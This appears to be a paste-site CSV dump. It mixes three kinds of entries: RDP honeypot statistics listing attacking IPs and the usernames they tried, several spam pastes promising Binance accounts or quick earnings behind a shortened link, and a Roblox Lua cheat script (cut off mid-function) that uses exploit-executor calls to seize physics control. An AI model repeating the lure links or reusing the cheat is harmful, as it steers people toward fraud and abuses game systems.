id,title,username,language,date,content
epe1v7Hh,Binance account CW,Ghost47wastaken,JavaScript,Friday 28th of March 2025 07:20:05 PM CDT," 
Pdf https://tinyurl.com/methodssss


YdVe1WmlED
"
RPKf4zv0,2025-03-27_stats.json,rdp_snitch,JSON,Friday 28th of March 2025 07:18:36 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 104796,
    ""156.146.57.51"": 27051,
    ""156.146.57.186"": 10167,
    ""150.95.89.149"": 12975,
    ""156.146.57.52"": 12993,
    ""156.146.57.110"": 51945,
    ""156.146.57.174"": 12993,
    ""146.190.105.191"": 2100,
    ""106.14.144.233"": 429,
    ""185.7.214.81"": 24,
    ""92.255.57.86"": 24,
    ""188.166.250.11"": 6,
    ""92.255.85.59"": 27,
    ""198.235.24.221"": 9,
    ""185.196.10.51"": 3,
    ""185.42.12.5"": 12,
    ""45.227.254.151"": 6,
    ""92.255.57.11"": 6,
    ""185.147.124.165"": 9,
    ""88.214.25.125"": 12,
    ""165.140.242.48"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""47.121.132.191"": 9,
    ""198.235.24.158"": 9,
    ""45.227.254.130"": 9,
    ""58.218.199.219"": 15,
    ""147.185.132.144"": 9,
    ""165.154.33.72"": 3,
    ""167.94.146.62"": 3,
    ""198.235.24.58"": 9,
    ""45.227.254.155"": 6
  },
  ""asn"": {
    ""AS60068"": 104796,
    ""AS212238"": 115149,
    ""AS135161"": 12975,
    ""AS14061"": 2106,
    ""AS37963"": 438,
    ""AS207566"": 81,
    ""AS396982"": 36,
    ""AS42624"": 3,
    ""AS59425"": 12,
    ""AS267784"": 21,
    ""AS49505"": 9,
    ""AS35042"": 12,
    ""AS203380"": 3,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""AS4134"": 15,
    ""AS135377"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 104796,
    ""Datacamp Limited"": 115149,
    ""GMO-Z.COM PTE. LTD."": 12975,
    ""DigitalOcean, LLC"": 2106,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Chang Way Technologies Co. Limited"": 93,
    ""Google LLC"": 36,
    ""Global-Data System IT Corporation"": 3,
    ""Flyservers S.A."": 21,
    ""JSC Selectel"": 9,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""DA International Group Ltd."": 3,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 9,
    ""Chinanet"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 104796,
    ""Datacamp Limited"": 115149,
    ""Zcom Thai"": 12975,
    ""DigitalOcean, LLC"": 2100,
    ""Aliyun Computing Co., LTD"": 429,
    ""Chang Way Technologies Co. Limited"": 81,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Global-Data System IT Corporation"": 3,
    ""Horizon LLC"": 12,
    ""Xwin Universal LTD"": 21,
    ""Almira LLC"": 9,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""AlphaVPS LLC"": 3,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""Alibaba.com LLC"": 9,
    ""Chinanet JS"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""North West"": 219945,
    ""Tokyo"": 12975,
    ""South West"": 2106,
    ""Shanghai"": 429,
    ""Moscow"": 102,
    ""California"": 36,
    ""Bern"": 3,
    ""Vilnius"": 21,
    ""Kowloon City"": 12,
    ""New York"": 3,
    ""Virginia"": 9,
    ""North Holland"": 9,
    ""Guangdong"": 9,
    ""Jiangsu"": 15,
    ""Metro Manila"": 3,
    ""Hesse"": 3
  },
  ""country"": {
    ""Singapore"": 222051,
    ""Japan"": 12975,
    ""China"": 453,
    ""Russia"": 102,
    ""United States"": 48,
    ""Switzerland"": 3,
    ""Lithuania"": 21,
    ""Hong Kong"": 12,
    ""The Netherlands"": 9,
    ""Philippines"": 3,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 235482,
    ""Administr"": 81,
    ""dMyvHqbTU"": 3,
    ""kxhfrL"": 3,
    ""uilNGI"": 3,
    ""(empty)"": 6,
    ""Test"": 36,
    ""Domain"": 36,
    ""nYDxTyrJG"": 3,
    ""nviMZm"": 3,
    ""HWMrzF"": 3,
    ""IjEZbYYrE"": 3,
    ""yZYeAM"": 3,
    ""djdDqu"": 3,
    ""Administrator"": 3,
    ""NgbrwOusw"": 3,
    ""oHCnXw"": 3,
    ""SBUubS"": 3
  },
  ""keyboard"": {
    ""Unknown"": 235680
  },
  ""client_build"": {
    ""Unknown"": 235680
  },
  ""client_name"": {
    ""Unknown"": 235680
  },
  ""ip_type"": {
    ""hosting & proxy"": 222474,
    ""hosting"": 13041,
    ""proxy"": 108,
    ""Unknown"": 57
  }
}"
aJN7EdBU,2025-03-27_stats.json,rdp_snitch,JSON,Friday 28th of March 2025 07:16:22 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 104793,
    ""156.146.57.51"": 27051,
    ""156.146.57.186"": 10167,
    ""150.95.89.149"": 12975,
    ""156.146.57.52"": 12993,
    ""156.146.57.110"": 51945,
    ""156.146.57.174"": 12993,
    ""146.190.105.191"": 2100,
    ""106.14.144.233"": 429,
    ""185.7.214.81"": 24,
    ""92.255.57.86"": 24,
    ""188.166.250.11"": 6,
    ""92.255.85.59"": 27,
    ""198.235.24.221"": 9,
    ""185.196.10.51"": 3,
    ""185.42.12.5"": 12,
    ""45.227.254.151"": 6,
    ""92.255.57.11"": 6,
    ""185.147.124.165"": 9,
    ""88.214.25.125"": 12,
    ""165.140.242.48"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""47.121.132.191"": 9,
    ""198.235.24.158"": 9,
    ""45.227.254.130"": 9,
    ""58.218.199.219"": 15,
    ""147.185.132.144"": 9,
    ""165.154.33.72"": 3,
    ""167.94.146.62"": 3,
    ""198.235.24.58"": 9,
    ""45.227.254.155"": 6
  },
  ""asn"": {
    ""AS60068"": 104793,
    ""AS212238"": 115149,
    ""AS135161"": 12975,
    ""AS14061"": 2106,
    ""AS37963"": 438,
    ""AS207566"": 81,
    ""AS396982"": 36,
    ""AS42624"": 3,
    ""AS59425"": 12,
    ""AS267784"": 21,
    ""AS49505"": 9,
    ""AS35042"": 12,
    ""AS203380"": 3,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""AS4134"": 15,
    ""AS135377"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 104793,
    ""Datacamp Limited"": 115149,
    ""GMO-Z.COM PTE. LTD."": 12975,
    ""DigitalOcean, LLC"": 2106,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Chang Way Technologies Co. Limited"": 93,
    ""Google LLC"": 36,
    ""Global-Data System IT Corporation"": 3,
    ""Flyservers S.A."": 21,
    ""JSC Selectel"": 9,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""DA International Group Ltd."": 3,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 9,
    ""Chinanet"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 104793,
    ""Datacamp Limited"": 115149,
    ""Zcom Thai"": 12975,
    ""DigitalOcean, LLC"": 2100,
    ""Aliyun Computing Co., LTD"": 429,
    ""Chang Way Technologies Co. Limited"": 81,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Global-Data System IT Corporation"": 3,
    ""Horizon LLC"": 12,
    ""Xwin Universal LTD"": 21,
    ""Almira LLC"": 9,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""AlphaVPS LLC"": 3,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""Alibaba.com LLC"": 9,
    ""Chinanet JS"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""North West"": 219942,
    ""Tokyo"": 12975,
    ""South West"": 2106,
    ""Shanghai"": 429,
    ""Moscow"": 102,
    ""California"": 36,
    ""Bern"": 3,
    ""Vilnius"": 21,
    ""Kowloon City"": 12,
    ""New York"": 3,
    ""Virginia"": 9,
    ""North Holland"": 9,
    ""Guangdong"": 9,
    ""Jiangsu"": 15,
    ""Metro Manila"": 3,
    ""Hesse"": 3
  },
  ""country"": {
    ""Singapore"": 222048,
    ""Japan"": 12975,
    ""China"": 453,
    ""Russia"": 102,
    ""United States"": 48,
    ""Switzerland"": 3,
    ""Lithuania"": 21,
    ""Hong Kong"": 12,
    ""The Netherlands"": 9,
    ""Philippines"": 3,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 235479,
    ""Administr"": 81,
    ""dMyvHqbTU"": 3,
    ""kxhfrL"": 3,
    ""uilNGI"": 3,
    ""(empty)"": 6,
    ""Test"": 36,
    ""Domain"": 36,
    ""nYDxTyrJG"": 3,
    ""nviMZm"": 3,
    ""HWMrzF"": 3,
    ""IjEZbYYrE"": 3,
    ""yZYeAM"": 3,
    ""djdDqu"": 3,
    ""Administrator"": 3,
    ""NgbrwOusw"": 3,
    ""oHCnXw"": 3,
    ""SBUubS"": 3
  },
  ""keyboard"": {
    ""Unknown"": 235677
  },
  ""client_build"": {
    ""Unknown"": 235677
  },
  ""client_name"": {
    ""Unknown"": 235677
  },
  ""ip_type"": {
    ""hosting & proxy"": 222471,
    ""hosting"": 13041,
    ""proxy"": 108,
    ""Unknown"": 57
  }
}"
df6MTAmb,2025-03-27_stats.json,rdp_snitch,JSON,Friday 28th of March 2025 07:15:18 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 104790,
    ""156.146.57.51"": 27051,
    ""156.146.57.186"": 10167,
    ""150.95.89.149"": 12975,
    ""156.146.57.52"": 12993,
    ""156.146.57.110"": 51945,
    ""156.146.57.174"": 12993,
    ""146.190.105.191"": 2100,
    ""106.14.144.233"": 429,
    ""185.7.214.81"": 24,
    ""92.255.57.86"": 24,
    ""188.166.250.11"": 6,
    ""92.255.85.59"": 27,
    ""198.235.24.221"": 9,
    ""185.196.10.51"": 3,
    ""185.42.12.5"": 12,
    ""45.227.254.151"": 6,
    ""92.255.57.11"": 6,
    ""185.147.124.165"": 9,
    ""88.214.25.125"": 12,
    ""165.140.242.48"": 3,
    ""185.196.220.41"": 9,
    ""193.142.146.227"": 9,
    ""47.121.132.191"": 9,
    ""198.235.24.158"": 9,
    ""45.227.254.130"": 9,
    ""58.218.199.219"": 15,
    ""147.185.132.144"": 9,
    ""165.154.33.72"": 3,
    ""167.94.146.62"": 3,
    ""198.235.24.58"": 9,
    ""45.227.254.155"": 6
  },
  ""asn"": {
    ""AS60068"": 104790,
    ""AS212238"": 115149,
    ""AS135161"": 12975,
    ""AS14061"": 2106,
    ""AS37963"": 438,
    ""AS207566"": 81,
    ""AS396982"": 36,
    ""AS42624"": 3,
    ""AS59425"": 12,
    ""AS267784"": 21,
    ""AS49505"": 9,
    ""AS35042"": 12,
    ""AS203380"": 3,
    ""AS208046"": 9,
    ""AS213438"": 9,
    ""AS4134"": 15,
    ""AS135377"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""DataCamp Limited"": 104790,
    ""Datacamp Limited"": 115149,
    ""GMO-Z.COM PTE. LTD."": 12975,
    ""DigitalOcean, LLC"": 2106,
    ""Hangzhou Alibaba Advertising Co"": 429,
    ""Chang Way Technologies Co. Limited"": 93,
    ""Google LLC"": 36,
    ""Global-Data System IT Corporation"": 3,
    ""Flyservers S.A."": 21,
    ""JSC Selectel"": 9,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""DA International Group Ltd."": 3,
    ""ColocationX Ltd."": 9,
    ""ColocaTel Inc."": 9,
    ""Hangzhou Alibaba Advertising Co., Ltd."": 9,
    ""Chinanet"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Cdn77 SGP"": 104790,
    ""Datacamp Limited"": 115149,
    ""Zcom Thai"": 12975,
    ""DigitalOcean, LLC"": 2100,
    ""Aliyun Computing Co., LTD"": 429,
    ""Chang Way Technologies Co. Limited"": 81,
    ""Digitalocean"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Global-Data System IT Corporation"": 3,
    ""Horizon LLC"": 12,
    ""Xwin Universal LTD"": 21,
    ""Almira LLC"": 9,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""AlphaVPS LLC"": 3,
    ""ColocationX Ltd"": 9,
    ""ColocaTel Inc"": 9,
    ""Alibaba.com LLC"": 9,
    ""Chinanet JS"": 15,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""North West"": 219939,
    ""Tokyo"": 12975,
    ""South West"": 2106,
    ""Shanghai"": 429,
    ""Moscow"": 102,
    ""California"": 36,
    ""Bern"": 3,
    ""Vilnius"": 21,
    ""Kowloon City"": 12,
    ""New York"": 3,
    ""Virginia"": 9,
    ""North Holland"": 9,
    ""Guangdong"": 9,
    ""Jiangsu"": 15,
    ""Metro Manila"": 3,
    ""Hesse"": 3
  },
  ""country"": {
    ""Singapore"": 222045,
    ""Japan"": 12975,
    ""China"": 453,
    ""Russia"": 102,
    ""United States"": 48,
    ""Switzerland"": 3,
    ""Lithuania"": 21,
    ""Hong Kong"": 12,
    ""The Netherlands"": 9,
    ""Philippines"": 3,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 235476,
    ""Administr"": 81,
    ""dMyvHqbTU"": 3,
    ""kxhfrL"": 3,
    ""uilNGI"": 3,
    ""(empty)"": 6,
    ""Test"": 36,
    ""Domain"": 36,
    ""nYDxTyrJG"": 3,
    ""nviMZm"": 3,
    ""HWMrzF"": 3,
    ""IjEZbYYrE"": 3,
    ""yZYeAM"": 3,
    ""djdDqu"": 3,
    ""Administrator"": 3,
    ""NgbrwOusw"": 3,
    ""oHCnXw"": 3,
    ""SBUubS"": 3
  },
  ""keyboard"": {
    ""Unknown"": 235674
  },
  ""client_build"": {
    ""Unknown"": 235674
  },
  ""client_name"": {
    ""Unknown"": 235674
  },
  ""ip_type"": {
    ""hosting & proxy"": 222468,
    ""hosting"": 13041,
    ""proxy"": 108,
    ""Unknown"": 57
  }
}"
Qa9ZvPr1,EARN $900 INSTANTLY 2025 BT,Ghost47wastaken,JavaScript,Friday 28th of March 2025 07:04:10 PM CDT," 
Pdf https://tinyurl.com/methodssss


l0qh23itpH
"
5BH5qX1v,Binance account CW,harry5185815,JavaScript,Friday 28th of March 2025 06:48:07 PM CDT," 
Pdf https://tinyurl.com/methodssss


ybtKwBUDEK
"
3VyHa5GZ,Sans,enzo_gamer1e2n3z0,Lua,Friday 28th of March 2025 06:39:34 PM CDT,"-- Created by Nebula_Zorua --
-- Sans Curse (A Curse of Light) --
-- Custom Arcane Adventures Magic --
-- Wielder: Everybody (Released) --
-- Why i did make this --
-- I don't even LIKE undertale --

-- Discord: Nebula the Zorua#6969
-- Youtube: https://www.youtube.com/channel/UCo9oU9dCw8jnuVLuy4_SATA

-- You can change the Magic Circle n stuff down under Customization, at MagicVariant --

HumanDied = false
local CountSCIFIMOVIELOL = 1
function SCIFIMOVIELOL(Part0,Part1,Position,Angle)
	local AlignPos = Instance.new('AlignPosition', Part1); AlignPos.Name = ""AliP_""..CountSCIFIMOVIELOL
	AlignPos.ApplyAtCenterOfMass = true;
	AlignPos.MaxForce = 5772000--67752;
	AlignPos.MaxVelocity = math.huge/9e110;
	AlignPos.ReactionForceEnabled = false;
	AlignPos.Responsiveness = 200;
	AlignPos.RigidityEnabled = false;
	local AlignOri = Instance.new('AlignOrientation', Part1); AlignOri.Name = ""AliO_""..CountSCIFIMOVIELOL
	AlignOri.MaxAngularVelocity = math.huge/9e110;
	AlignOri.MaxTorque = 5772000
	AlignOri.PrimaryAxisOnly = false;
	AlignOri.ReactionTorqueEnabled = false;
	AlignOri.Responsiveness = 200;
	AlignOri.RigidityEnabled = false;
	local AttachmentA=Instance.new('Attachment',Part1); AttachmentA.Name = ""Ath_""..CountSCIFIMOVIELOL
	local AttachmentB=Instance.new('Attachment',Part0); AttachmentB.Name = ""Ath_""..CountSCIFIMOVIELOL
	AttachmentA.Orientation = Angle or Vector3.new(0,0,0)
	AttachmentA.Position = Position or Vector3.new(0,0,0)
	AlignPos.Attachment1 = AttachmentA;
	AlignPos.Attachment0 = AttachmentB;
	AlignOri.Attachment1 = AttachmentA;
	AlignOri.Attachment0 = AttachmentB;
	CountSCIFIMOVIELOL = CountSCIFIMOVIELOL + 1
	return {AlignPos,AlignOri,AttachmentA,AttachmentB}
end

if _G.netted ~= true then
	_G.netted = true
	coroutine.wrap(function()
		settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
		settings().Physics.AllowSleep = false
		game:GetService(""RunService"").RenderStepped:Connect(function()
			game:FindFirstChildOfClass(""Players"").LocalPlayer.MaximumSimulationRadius=math.pow(math.huge,math.huge)
			sethiddenproperty(game:FindFirstChildOfClass(""Players"").LocalPlayer,""SimulationRadius"",math.huge*math.huge)
		end)
	end)()
end

game:FindFirstChildOfClass(""Players"").LocalPlayer[""Character""].Archivable = true
local hatnameclone = {}
for _,v in next, game:FindFirstChildOfClass(""Players"").LocalPlayer[""Character""]:GetChildren() do
	if v:IsA(""Accessory"") then
		if hatnameclone[v.Name] then
			if hatnameclone[v.Name] == ""s"" then
				hatnameclone[v.Name] = {}
			end
			table.insert(hatnameclone[v.Name],v)
		else
			hatnameclone[v.Name] = ""s""
		end
	end
end
for _,v in pairs(hatnameclone) do
	if type(v) == ""table"" then
		local num = 1
		for _,w in pairs(v) do
			w.Name = w.Name..num
			num = num + 1
		end
	end
end
hatnameclone = nil

local DeadChar = game:FindFirstChildOfClass(""Players"").LocalPlayer.Character

local fldr = Instance.new(""Folder"",game:FindFirstChildOfClass(""Players"").LocalPlayer[""Character""])
fldr.Name = ""DMYF""
local CloneChar = DeadChar:Clone()
local ANIMATIONHERE
if CloneChar:FindFirstChild(""Animate"") then
	ANIMATIONHERE = CloneChar:FindFirstChild(""Animate""):Clone()
	CloneChar:FindFirstChild(""Animate""):Destroy()
end
if CloneChar:FindFirstChildOfClass(""Folder"") then CloneChar:FindFirstChildOfClass(""Folder""):Destroy() end
if CloneChar.Torso:FindFirstChild(""Neck"") then
	local Clonessss = CloneChar.Torso:FindFirstChild(""Neck""):Clone()
	Clonessss.Part0 = nil
	Clonessss.Part1 = DeadChar.Head
	Clonessss.Parent = DeadChar.Torso
end
CloneChar.Parent = fldr
CloneChar.HumanoidRootPart.CFrame = DeadChar.HumanoidRootPart.CFrame
CloneChar.Humanoid.BreakJointsOnDeath = false
CloneChar.Name = ""non""
CloneChar.Humanoid.DisplayDistanceType = ""None""

for _,v in next, DeadChar:GetChildren() do
	if v:IsA(""Accessory"") then
		local topacc = false
		if v.Handle:FindFirstChildOfClass(""Weld"") then v.Handle:FindFirstChildOfClass(""Weld""):Destroy() end
		v.Handle.Massless = true
		v.Handle.CanCollide = false
		if v.Handle:FindFirstChildOfClass(""Attachment"") then
			local ath__ = v.Handle:FindFirstChildOfClass(""Attachment"")
			if ath__.Name == ""HatAttachment"" or ath__.Name == ""HairAttachment"" or ath__.Name == ""FaceFrontAttachment"" or ath__.Name == ""FaceCenterAttachment"" then
				topacc = ath__.Name
			end
		end
        local bv = Instance.new(""BodyVelocity"",v.Handle)
		bv.Velocity = Vector3.new(0,0,0)
		coroutine.wrap(function()
			if topacc then
				local allthings = SCIFIMOVIELOL(v.Handle,DeadChar.Torso,Vector3.new(0,1.5,0)+ (DeadChar.Head[topacc].Position + (v.Handle[topacc].Position*-1)),Vector3.new(0,0,0))
				local normaltop = allthings[1].Attachment1
				local alipos = allthings[1]
				local alirot = allthings[2]
				local p0 = v.Handle
				local p1 = DeadChar.Head
				alipos.Parent = CloneChar:FindFirstChild(v.Name).Handle
				alirot.Parent = CloneChar:FindFirstChild(v.Name).Handle
				while true do
					game:GetService(""RunService"").RenderStepped:wait()
					if HumanDied then break end
					coroutine.wrap(function()
						if alipos.Attachment1 == normaltop then
							p0.CFrame = p0.CFrame:lerp((((DeadChar.Torso.CFrame * CFrame.new(0,1.5,0)) * p1[topacc].CFrame) * p0[topacc].CFrame:inverse()),1)
						else
							v.Handle.CFrame = v.Handle.CFrame:lerp(alipos.Attachment1.Parent.CFrame * CFrame.new(alipos.Attachment1.Position) * CFrame.Angles(math.rad(alipos.Attachment1.Rotation.X),math.rad(alipos.Attachment1.Rotation.Y),math.rad(alipos.Attachment1.Rotation.Z)),1)
						end
					end)()
				end
			else
				SCIFIMOVIELOL(v.Handle,CloneChar[v.Name].Handle,Vector3.new(0,0,0),Vector3.new(0,0,0))
			end
		end)()
    end
end

local a = DeadChar.Torso
local b = DeadChar.HumanoidRootPart
local c = DeadChar.Humanoid
a.Parent = game:FindFirstChildOfClass(""Workspace"")
c.Parent = game:FindFirstChildOfClass(""Workspace"")
local told = a:Clone()
local told1 = c:Clone()
b[""RootJoint""].Part0 = told
b[""RootJoint""].Part1 = DeadChar.Head
a.Name = ""torso""
a.Neck:Destroy()
c.Name = ""Mizt Hub Best""
told.Parent = DeadChar
told1.Parent = DeadChar
DeadChar.PrimaryPart = told
told1.Health = 0
b:Destroy()
a.Parent = DeadChar
c.Parent = DeadChar
told:Destroy()
told1:Destroy()
a.Name = ""Torso""

if CloneChar.Head:FindFirstChildOfClass(""Decal"") then CloneChar.Head:FindFirstChildOfClass(""Decal"").Transparency = 1 end
if DeadChar:FindFirstChild(""Animate"") then DeadChar:FindFirstChild(""Animate""):Destroy() end

local Collider
function UnCollide()
    if HumanDied then Collider:Disconnect(); return end
    --[[for _,Parts in next, CloneChar:GetChildren() do
        if Parts:IsA(""BasePart"") then
            Parts.CanCollide = false 
        end 
    end]]
    for _,Parts in next, DeadChar:GetChildren() do
        if Parts:IsA(""BasePart"") then
        Parts.CanCollide = false
        end 
    end 
end
Collider = game:GetService(""RunService"").Stepped:Connect(UnCollide)

local resetBindable = Instance.new(""BindableEvent"")
resetBindable.Event:connect(function()
    game:GetService(""StarterGui""):SetCore(""ResetButtonCallback"", true)
	resetBindable:Destroy()
	HumanDied = true
    pcall(function()
		game:FindFirstChildOfClass(""Players"").LocalPlayer.Character = DeadChar
		DeadChar.Head:Destroy()
		DeadChar:FindFirstChildOfClass(""Humanoid""):Destroy()
		game:FindFirstChildOfClass(""Players"").LocalPlayer.Character = CloneChar
		if DeadChar:FindFirstChildOfClass(""Folder"") then DeadChar:FindFirstChildOfClass(""Folder""):Destroy() end
	end)
end)
game:GetService(""StarterGui""):SetCore(""ResetButtonCallback"", resetBindable)

coroutine.wrap(function()
    while true do
        game:GetService(""RunService"").RenderStepped:wait()
        if not CloneChar or not CloneChar:FindFirstChild(""Head"") or not CloneChar:FindFirstChildOfClass(""Humanoid"") or CloneChar:FindFirstChildOfClass(""Humanoid"").Health <= 0 and not DeadChar or not DeadChar:FindFirstChild(""Head"") or not DeadChar:FindFirstChildOfClass(""Humanoid"") or DeadChar:FindFirstChildOfClass(""Humanoid"").Health <= 0 then 
            HumanDied = true
            pcall(function()
				game:FindFirstChildOfClass(""Players"").LocalPlayer.Character = DeadChar
				DeadChar.Head:Destroy()
				DeadChar:FindFirstChildOfClass(""Humanoid""):Destroy()
				game:FindFirstChildOfClass(""Players"").LocalPlayer.Character = CloneChar
				if DeadChar:FindFirstChildOfClass(""Folder"") then DeadChar:FindFirstChildOfClass(""Folder""):Destroy() end
			end)
            if resetBindable then
                game:GetService(""StarterGui""):SetCore(""ResetButtonCallback"", true)
                resetBindable:Destroy()
            end
            break
        end		
    end
end)()


SCIFIMOVIELOL(DeadChar[""Head""],CloneChar[""Head""])
SCIFIMOVIELOL(DeadChar[""Torso""],CloneChar[""Torso""])
SCIFIMOVIELOL(DeadChar[""Left Arm""],CloneChar[""Left Arm""])
SCIFIMOVIELOL(DeadChar[""Right Arm""],CloneChar[""Right Arm""])
SCIFIMOVIELOL(DeadChar[""Left Leg""],CloneChar[""Left Leg""])
SCIFIMOVIELOL(DeadChar[""Right Leg""],CloneChar[""Right Leg""])

for _,v in pairs(DeadChar:GetChildren()) do
	if v:IsA(""BasePart"") and v.Name ~= ""Head"" then
		--[[local bv = Instance.new(""BodyVelocity"",v)
		bv.Velocity = Vector3.new(0,0,0)
		coroutine.wrap(function()
			while true do
				game:GetService(""RunService"").RenderStepped:wait()
				if HumanDied then break end
				v.CFrame = CloneChar[v.Name].CFrame
			end
		end)()]]
	elseif v:IsA(""BasePart"") and v.Name == ""Head"" then
		local bv = Instance.new(""BodyVelocity"",v)
		bv.Velocity = Vector3.new(0,0,0)
		coroutine.wrap(function()
			while true do
				game:GetService(""RunService"").RenderStepped:wait()
				if HumanDied then break end
				v.CFrame = DeadChar.Torso.CFrame * CFrame.new(0,1.5,0)
			end
		end)()
	end
end

for _,BodyParts in next, CloneChar:GetDescendants() do
if BodyParts:IsA(""BasePart"") or BodyParts:IsA(""Part"") then
BodyParts.Transparency = 1 end end
game:GetService(""RunService"").RenderStepped:wait()
game:FindFirstChildOfClass(""Players"").LocalPlayer.Character = CloneChar
game:FindFirstChildOfClass(""Workspace""):FindFirstChildOfClass(""Camera"").CameraSubject = CloneChar.Humanoid

for _,v in next, DeadChar:GetChildren() do
	if v:IsA(""Accessory"") then
		if v.Handle:FindFirstChildOfClass(""Weld"") then v.Handle:FindFirstChildOfClass(""Weld""):Destroy() end
	end
end

if ANIMATIONHERE then ANIMATIONHERE.Parent = CloneChar end


--// Shortcut Variables \\--
local S = setmetatable({},{__index = function(s,i) return game:service(i) end})
local CF = {N=CFrame.new,A=CFrame.Angles,fEA=CFrame.fromEulerAnglesXYZ}
local C3 = {N=Color3.new,RGB=Color3.fromRGB,HSV=Color3.fromHSV,tHSV=Color3.toHSV}
local V3 = {N=Vector3.new,FNI=Vector3.FromNormalId,A=Vector3.FromAxis}
local M = {C=math.cos,R=math.rad,S=math.sin,P=math.pi,RNG=math.random,MRS=math.randomseed,H=math.huge,RRNG = function(min,max,div) return math.rad(math.random(min,max)/(div or 1)) end}
local R3 = {N=Region3.new}
local De = S.Debris
local WS = workspace
local Lght = S.Lighting
local RepS = S.ReplicatedStorage
local IN = Instance.new
local Plrs = S.Players

local Emit = IN(""ParticleEmitter"").Emit;

--// Initializing \\--
local Plr = Plrs.LocalPlayer
local Char = Plr.Character
local Hum = Char:FindFirstChildOfClass'Humanoid'
local RArm = Char[""Right Arm""]
local LArm = Char[""Left Arm""]
local RLeg = Char[""Right Leg""]
local LLeg = Char[""Left Leg""]	
local Root = Char:FindFirstChild'HumanoidRootPart'
local Torso = Char.Torso
local Head = Char.Head
local NeutralAnims = true
local Attack = false
local Debounces = {Debounces={}}
local Mouse = Plr:GetMouse()
local Hit = {}
local Sine = 0
local Change = 1

local Effects = IN(""Folder"",Char)
Effects.Name = ""Effects""


--// Debounce System \\--


function Debounces:New(name,cooldown)
	local aaaaa = {Usable=true,Cooldown=cooldown or 2,CoolingDown=false,LastUse=0}
	setmetatable(aaaaa,{__index = Debounces})
	Debounces.Debounces[name] = aaaaa
	return aaaaa
end

function Debounces:Use(overrideUsable)
	assert(self.Usable ~= nil and self.LastUse ~= nil and self.CoolingDown ~= nil,""Expected ':' not '.' calling member function Use"")
	if(self.Usable or overrideUsable)then
		self.Usable = false
		self.CoolingDown = true
		local LastUse = time()
		self.LastUse = LastUse
		delay(self.Cooldown or 2,function()
			if(self.LastUse == LastUse)then
				self.CoolingDown = false
				self.Usable = true
			end
		end)
	end
end

function Debounces:Get(name)
	assert(typeof(name) == 'string',(""bad argument #1 to 'get' (string expected, got %s)""):format(typeof(name) == nil and ""no value"" or typeof(name)))
	for i,v in next, Debounces.Debounces do
		if(i == name)then
			return v;
		end
	end
end

function Debounces:GetProgressPercentage()
	assert(self.Usable ~= nil and self.LastUse ~= nil and self.CoolingDown ~= nil,""Expected ':' not '.' calling member function Use"")
	if(self.CoolingDown and not self.Usable)then
		return math.max(
			math.floor(
				(
					(time()-self.LastUse)/self.Cooldown or 2
				)*100
			)
		)
	else
		return 100
	end
end

--// Instance Creation Functions \\--

function Sound(parent,id,pitch,volume,looped,effect,autoPlay)
	local Sound = IN(""Sound"")
	Sound.SoundId = ""rbxassetid://"".. tostring(id or 0)
	Sound.Pitch = pitch or 1
	Sound.Volume = volume or 1
	Sound.Looped = looped or false
	if(autoPlay)then
		coroutine.wrap(function()
			repeat wait() until Sound.IsLoaded
			Sound.Playing = autoPlay or false
		end)()
	end
	if(not looped and effect)then
		Sound.Stopped:connect(function()
			Sound.Volume = 0
			Sound:destroy()
		end)
	elseif(effect)then
		warn(""Sound can't be looped and a sound effect!"")
	end
	Sound.Parent =parent or Torso
	return Sound
end
function Part(parent,color,material,size,cframe,anchored,cancollide)
	local part = IN(""Part"")
	part.Parent = parent or Char
	part[typeof(color) == 'BrickColor' and 'BrickColor' or 'Color'] = color or C3.N(0,0,0)
	part.Material = material or Enum.Material.SmoothPlastic
	part.TopSurface,part.BottomSurface=10,10
	part.Size = size or V3.N(1,1,1)
	part.CFrame = cframe or CF.N(0,0,0)
	part.CanCollide = cancollide or false
	part.Anchored = anchored or false
	return part
end

function Weld(part0,part1,c0,c1)
